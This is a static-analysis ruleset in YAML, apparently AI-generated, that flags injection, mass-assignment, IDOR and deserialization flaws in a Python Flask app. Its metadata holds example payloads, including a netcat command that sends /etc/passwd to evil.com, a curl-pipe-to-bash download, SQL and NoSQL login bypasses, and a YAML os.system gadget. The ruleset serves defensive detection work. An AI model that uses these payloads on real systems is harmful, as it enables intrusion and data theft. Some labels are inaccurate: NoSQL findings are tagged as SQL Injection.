rules:
- id: fixora-wrapper-delete-profile
  patterns:
  - pattern-inside: "def delete_profile(...):\n  ..."
  - pattern-either:
    - pattern: base64.b64decode(...)
    - pattern: $OBJ.b64decode(...)
    - pattern: b64decode(...)
  message: 'IDOR / Broken Access Control via `encoded_id`

    Vulnerable Sink: Passes untrusted data directly to `base64.b64decode`.'
  severity: ERROR
  languages: &id001
  - python
  metadata: &id002
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: IDOR / Broken Access Control
    confidence: HIGH
    wrapper_defined_in: auth.py
    wraps:
    - base64.b64decode
    modules_used:
    - base64
    - flask
    vulnerable_parameter: encoded_id
    malicious_payload: ''
    exploit_explanation: The attacker can decode and modify the encoded_id to access
      another user's profile.
    exploit_injected_example: ''
    impact_summary: Attackers can delete any user's profile, leading to data loss
      and potential security breaches.
- id: fixora-taint-delete-profile
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: delete_profile(...)
  - pattern: $OBJ.delete_profile(...)
  message: 'Taint tracked to vulnerable wrapper `delete_profile`.

    IDOR / Broken Access Control via `encoded_id`

    Vulnerable Sink: Passes untrusted data directly to `base64.b64decode`.'
  severity: ERROR
  languages: *id001
  metadata: *id002
- id: fixora-wrapper-get-profile
  patterns:
  - pattern-inside: "def get_profile(...):\n  ..."
  - pattern-either:
    - pattern: base64.b64decode(...)
    - pattern: $OBJ.b64decode(...)
    - pattern: b64decode(...)
  message: 'IDOR / Broken Access Control via `encoded_id`

    Vulnerable Sink: Passes untrusted data directly to `base64.b64decode`.'
  severity: ERROR
  languages: &id003
  - python
  metadata: &id004
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: IDOR / Broken Access Control
    confidence: HIGH
    wrapper_defined_in: auth.py
    wraps:
    - base64.b64decode
    modules_used:
    - base64
    - flask
    vulnerable_parameter: encoded_id
    malicious_payload: ''
    exploit_explanation: The attacker can decode and modify the encoded_id to access
      another user's profile.
    exploit_injected_example: ''
    impact_summary: Attackers can access any user's profile, leading to data exposure
      and potential security breaches.
- id: fixora-taint-get-profile
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: get_profile(...)
  - pattern: $OBJ.get_profile(...)
  message: 'Taint tracked to vulnerable wrapper `get_profile`.

    IDOR / Broken Access Control via `encoded_id`

    Vulnerable Sink: Passes untrusted data directly to `base64.b64decode`.'
  severity: ERROR
  languages: *id003
  metadata: *id004
- id: fixora-wrapper-update
  patterns:
  - pattern-inside: "def update(...):\n  ..."
  - pattern-either:
    - pattern: setattr(...)
    - pattern: $OBJ.setattr(...)
  message: 'Mass Assignment via `**kwargs`

    Vulnerable Sink: Passes untrusted data directly to `setattr`.'
  severity: ERROR
  languages: &id005
  - python
  metadata: &id006
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Mass Assignment
    confidence: HIGH
    wrapper_defined_in: auth.py
    wraps:
    - setattr
    modules_used:
    - builtins
    vulnerable_parameter: '**kwargs'
    malicious_payload: <malicious_data>
    exploit_explanation: The attacker can send arbitrary fields to update, including
      sensitive fields like role or is_verified.
    exploit_injected_example: update(**kwargs = <malicious_data>)
    impact_summary: Attackers can modify any attribute of the object, leading to security
      breaches and data corruption.
    cwe: &id007
    - CWE-915
    owasp: &id008
    - A03:2021
- id: fixora-taint-update
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: update(...)
  - pattern: $OBJ.update(...)
  message: 'Taint tracked to vulnerable wrapper `update`.

    Mass Assignment via `**kwargs`

    Vulnerable Sink: Passes untrusted data directly to `setattr`.'
  severity: ERROR
  languages: *id005
  metadata: *id006
- id: fixora-wrapper-update-user
  patterns:
  - pattern-inside: "def update_user(...):\n  ..."
  - pattern-either:
    - pattern: jsonify(...)
    - pattern: $OBJ.jsonify(...)
    - pattern: request.headers.get(...)
    - pattern: $OBJ.get(...)
    - pattern: get(...)
    - pattern: request.get_json(...)
    - pattern: $OBJ.get_json(...)
    - pattern: get_json(...)
  message: 'Mass Assignment via `request.get_json()`

    Vulnerable Sink: Passes untrusted data directly to `jsonify, request.headers.get,
    request.get_json`.'
  severity: ERROR
  languages: &id009
  - python
  metadata: &id010
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Mass Assignment
    confidence: HIGH
    wrapper_defined_in: auth.py
    wraps:
    - jsonify
    - request.headers.get
    - request.get_json
    modules_used:
    - flask
    vulnerable_parameter: request.get_json()
    malicious_payload: <malicious_data>
    exploit_explanation: The attacker can send arbitrary fields to update, including
      sensitive fields like role or is_verified.
    exploit_injected_example: update_user(request.get_json() = <malicious_data>)
    impact_summary: Attackers can modify any attribute of the user object, leading
      to security breaches and data corruption.
    cwe: *id007
    owasp: *id008
- id: fixora-taint-update-user
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: update_user(...)
  - pattern: $OBJ.update_user(...)
  message: 'Taint tracked to vulnerable wrapper `update_user`.

    Mass Assignment via `request.get_json()`

    Vulnerable Sink: Passes untrusted data directly to `jsonify, request.headers.get,
    request.get_json`.'
  severity: ERROR
  languages: *id009
  metadata: *id010
- id: fixora-wrapper-verify-token
  patterns:
  - pattern-inside: "def verify_token(...):\n  ..."
  - pattern-either:
    - pattern: jwt.decode(...)
    - pattern: $OBJ.decode(...)
    - pattern: decode(...)
  message: 'Cryptographic Failure via `token`

    Vulnerable Sink: Passes untrusted data directly to `jwt.decode`.'
  severity: ERROR
  languages: &id011
  - python
  metadata: &id012
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Cryptographic Failure
    confidence: HIGH
    wrapper_defined_in: auth.py
    wraps:
    - jwt.decode
    modules_used:
    - jwt
    vulnerable_parameter: token
    malicious_payload: <malicious_data>
    exploit_explanation: The attacker can re-sign a token with a different algorithm,
      potentially bypassing security checks.
    exploit_injected_example: verify_token(token = <malicious_data>)
    impact_summary: Attackers can bypass authentication and authorization checks,
      leading to security breaches and data exposure.
- id: fixora-taint-verify-token
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: verify_token(...)
  - pattern: $OBJ.verify_token(...)
  message: 'Taint tracked to vulnerable wrapper `verify_token`.

    Cryptographic Failure via `token`

    Vulnerable Sink: Passes untrusted data directly to `jwt.decode`.'
  severity: ERROR
  languages: *id011
  metadata: *id012
- id: fixora-wrapper-generate-user-report
  patterns:
  - pattern-inside: "def generate_user_report(...):\n  ..."
  - pattern-either:
    - pattern: cursor.execute(...)
    - pattern: $OBJ.execute(...)
    - pattern: execute(...)
  message: 'SQL Injection via `username`

    Vulnerable Sink: Passes untrusted data directly to `cursor.execute`.'
  severity: ERROR
  languages: &id013
  - python
  metadata: &id014
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: SQL Injection
    confidence: HIGH
    wrapper_defined_in: database.py
    wraps:
    - cursor.execute
    modules_used:
    - sqlite3
    vulnerable_parameter: username
    malicious_payload: admin' UNION SELECT password FROM credentials --
    exploit_explanation: The attacker can inject malicious SQL code by manipulating
      the username parameter.
    exploit_injected_example: generate_user_report(username = admin' UNION SELECT
      password FROM credentials --)
    impact_summary: Attackers can execute arbitrary SQL queries, leading to data exposure
      and potential security breaches.
    cwe: &id015
    - CWE-89
    owasp: &id016
    - A03:2021
- id: fixora-taint-generate-user-report
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: generate_user_report(...)
  - pattern: $OBJ.generate_user_report(...)
  message: 'Taint tracked to vulnerable wrapper `generate_user_report`.

    SQL Injection via `username`

    Vulnerable Sink: Passes untrusted data directly to `cursor.execute`.'
  severity: ERROR
  languages: *id013
  metadata: *id014
- id: fixora-wrapper-login
  patterns:
  - pattern-inside: "def login(...):\n  ..."
  - pattern-either:
    - pattern: db_mongo.users.find_one(...)
    - pattern: $OBJ.find_one(...)
    - pattern: find_one(...)
  message: 'SQL Injection via `password`

    Vulnerable Sink: Passes untrusted data directly to `db_mongo.users.find_one`.'
  severity: ERROR
  languages: &id017
  - python
  metadata: &id018
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: SQL Injection
    confidence: HIGH
    wrapper_defined_in: database.py
    wraps:
    - db_mongo.users.find_one
    modules_used:
    - pymongo
    vulnerable_parameter: password
    malicious_payload: '{"$ne": ""}'
    exploit_explanation: The attacker can inject malicious NoSQL code by manipulating
      the password parameter.
    exploit_injected_example: 'login(password = {"$ne": ""})'
    impact_summary: Attackers can bypass authentication checks, leading to security
      breaches and data exposure.
    cwe: *id015
    owasp: *id016
- id: fixora-taint-login
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: login(...)
  - pattern: $OBJ.login(...)
  message: 'Taint tracked to vulnerable wrapper `login`.

    SQL Injection via `password`

    Vulnerable Sink: Passes untrusted data directly to `db_mongo.users.find_one`.'
  severity: ERROR
  languages: *id017
  metadata: *id018
- id: fixora-wrapper-search-users
  patterns:
  - pattern-inside: "def search_users(...):\n  ..."
  - pattern-either:
    - pattern: db_mongo.users.find(...)
    - pattern: $OBJ.find(...)
    - pattern: find(...)
  message: 'SQL Injection via `q`

    Vulnerable Sink: Passes untrusted data directly to `db_mongo.users.find`.'
  severity: ERROR
  languages: &id019
  - python
  metadata: &id020
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: SQL Injection
    confidence: HIGH
    wrapper_defined_in: database.py
    wraps:
    - db_mongo.users.find
    modules_used:
    - pymongo
    vulnerable_parameter: q
    malicious_payload: '{"$regex": ".*"}'
    exploit_explanation: The attacker can inject malicious NoSQL code by manipulating
      the q parameter.
    exploit_injected_example: 'search_users(q = {"$regex": ".*"})'
    impact_summary: Attackers can execute arbitrary NoSQL queries, leading to data
      exposure and potential security breaches.
    cwe: *id015
    owasp: *id016
- id: fixora-taint-search-users
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: search_users(...)
  - pattern: $OBJ.search_users(...)
  message: 'Taint tracked to vulnerable wrapper `search_users`.

    SQL Injection via `q`

    Vulnerable Sink: Passes untrusted data directly to `db_mongo.users.find`.'
  severity: ERROR
  languages: *id019
  metadata: *id020
- id: fixora-wrapper-update-config
  patterns:
  - pattern-inside: "def update_config(...):\n  ..."
  - pattern-either:
    - pattern: deep_merge(...)
    - pattern: $OBJ.deep_merge(...)
  message: 'Mass Assignment via `data`

    Vulnerable Sink: Passes untrusted data directly to `deep_merge`.'
  severity: ERROR
  languages: &id021
  - python
  metadata: &id022
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Mass Assignment
    confidence: HIGH
    wrapper_defined_in: database.py
    wraps:
    - deep_merge
    modules_used:
    - builtins
    vulnerable_parameter: data
    malicious_payload: <malicious_data>
    exploit_explanation: The attacker can send arbitrary fields to update, including
      sensitive fields like debug or admin_enabled.
    exploit_injected_example: update_config(data = <malicious_data>)
    impact_summary: Attackers can modify any attribute of the config object, leading
      to security breaches and data corruption.
    cwe: *id007
    owasp: *id008
- id: fixora-taint-update-config
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: update_config(...)
  - pattern: $OBJ.update_config(...)
  message: 'Taint tracked to vulnerable wrapper `update_config`.

    Mass Assignment via `data`

    Vulnerable Sink: Passes untrusted data directly to `deep_merge`.'
  severity: ERROR
  languages: *id021
  metadata: *id022
- id: fixora-wrapper-background-worker
  patterns:
  - pattern-inside: "def background_worker(...):\n  ..."
  - pattern-either:
    - pattern: os.system(...)
    - pattern: $OBJ.system(...)
    - pattern: system(...)
  message: 'Command Injection via `recipient`

    Vulnerable Sink: Passes untrusted data directly to `os.system`.'
  severity: ERROR
  languages: &id023
  - python
  metadata: &id024
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Command Injection
    confidence: HIGH
    wrapper_defined_in: execution.py
    wraps:
    - os.system
    modules_used:
    - os
    vulnerable_parameter: recipient
    malicious_payload: attacker@evil.com; cat /etc/passwd | nc evil.com 9999
    exploit_explanation: The attacker can inject malicious shell commands by manipulating
      the recipient parameter.
    exploit_injected_example: background_worker(recipient = attacker@evil.com; cat
      /etc/passwd | nc evil.com 9999)
    impact_summary: Attackers can execute arbitrary system commands, leading to security
      breaches and data exposure.
    cwe: &id025
    - CWE-78
    owasp: &id026
    - A03:2021
- id: fixora-taint-background-worker
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: background_worker(...)
  - pattern: $OBJ.background_worker(...)
  message: 'Taint tracked to vulnerable wrapper `background_worker`.

    Command Injection via `recipient`

    Vulnerable Sink: Passes untrusted data directly to `os.system`.'
  severity: ERROR
  languages: *id023
  metadata: *id024
- id: fixora-wrapper-convert-image
  patterns:
  - pattern-inside: "def convert_image(...):\n  ..."
  - pattern-either:
    - pattern: subprocess.run(...)
    - pattern: $OBJ.run(...)
    - pattern: run(...)
  message: 'Command Injection via `input_file`

    Vulnerable Sink: Passes untrusted data directly to `subprocess.run`.'
  severity: ERROR
  languages: &id027
  - python
  metadata: &id028
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Command Injection
    confidence: HIGH
    wrapper_defined_in: execution.py
    wraps:
    - subprocess.run
    modules_used:
    - subprocess
    vulnerable_parameter: input_file
    malicious_payload: https://example.com/image.png; curl http://evil.com/shell.sh
      | bash
    exploit_explanation: The attacker can inject malicious shell commands by manipulating
      the input_file parameter.
    exploit_injected_example: convert_image(input_file = https://example.com/image.png;
      curl http://evil.com/shell.sh | bash)
    impact_summary: Attackers can execute arbitrary system commands, leading to security
      breaches and data exposure.
    cwe: *id025
    owasp: *id026
- id: fixora-taint-convert-image
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: convert_image(...)
  - pattern: $OBJ.convert_image(...)
  message: 'Taint tracked to vulnerable wrapper `convert_image`.

    Command Injection via `input_file`

    Vulnerable Sink: Passes untrusted data directly to `subprocess.run`.'
  severity: ERROR
  languages: *id027
  metadata: *id028
- id: fixora-wrapper-git-log
  patterns:
  - pattern-inside: "def git_log(...):\n  ..."
  - pattern-either:
    - pattern: subprocess.run(...)
    - pattern: $OBJ.run(...)
    - pattern: run(...)
  message: 'Command Injection via `branch`

    Vulnerable Sink: Passes untrusted data directly to `subprocess.run`.'
  severity: ERROR
  languages: &id029
  - python
  metadata: &id030
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Command Injection
    confidence: HIGH
    wrapper_defined_in: execution.py
    wraps:
    - subprocess.run
    modules_used:
    - subprocess
    vulnerable_parameter: branch
    malicious_payload: --exec=id
    exploit_explanation: The attacker can inject malicious shell commands by manipulating
      the branch parameter.
    exploit_injected_example: git_log(branch = --exec=id)
    impact_summary: Attackers can execute arbitrary system commands, leading to security
      breaches and data exposure.
    cwe: *id025
    owasp: *id026
- id: fixora-taint-git-log
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: git_log(...)
  - pattern: $OBJ.git_log(...)
  message: 'Taint tracked to vulnerable wrapper `git_log`.

    Command Injection via `branch`

    Vulnerable Sink: Passes untrusted data directly to `subprocess.run`.'
  severity: ERROR
  languages: *id029
  metadata: *id030
- id: fixora-wrapper-import-config
  patterns:
  - pattern-inside: "def import_config(...):\n  ..."
  - pattern-either:
    - pattern: yaml.load(...)
    - pattern: $OBJ.load(...)
    - pattern: load(...)
  message: 'Insecure Deserialization via `yaml_data`

    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
  severity: ERROR
  languages: &id031
  - python
  metadata: &id032
    category: security
    technology:
    - python
    source: fixora-ai-analysis
    vulnerability_type: Insecure Deserialization
    confidence: HIGH
    wrapper_defined_in: execution.py
    wraps:
    - yaml.load
    modules_used:
    - yaml
    vulnerable_parameter: yaml_data
    malicious_payload: '!!python/object/apply:os.system [''cat /etc/passwd'']'
    exploit_explanation: The attacker can inject malicious YAML code by manipulating
      the yaml_data parameter.
    exploit_injected_example: import_config(yaml_data = !!python/object/apply:os.system
      ['cat /etc/passwd'])
    impact_summary: Attackers can execute arbitrary system commands, leading to security
      breaches and data exposure.
- id: fixora-taint-import-config
  mode: taint
  pattern-sources:
  - pattern: request.$W(...)(
  - pattern: request.$W
  - pattern: req.$W
  - pattern: flask.request.$W
  - pattern: django.http.HttpRequest.$W
  - patterns:
    - pattern-inside: "@$APP.$METHOD(...)\ndef $FUNC(..., $ARG, ...):\n    ..."
    - metavariable-regex:
        metavariable: $METHOD
        regex: (?i)^(get|post|put|delete|patch|route)$
    - pattern: $ARG
  pattern-sinks:
  - pattern: import_config(...)
  - pattern: $OBJ.import_config(...)
  message: 'Taint tracked to vulnerable wrapper `import_config`.

    Insecure Deserialization via `yaml_data`

    Vulnerable Sink: Passes untrusted data directly to `yaml.load`.'
  severity: ERROR
  languages: *id031
  metadata: *id032
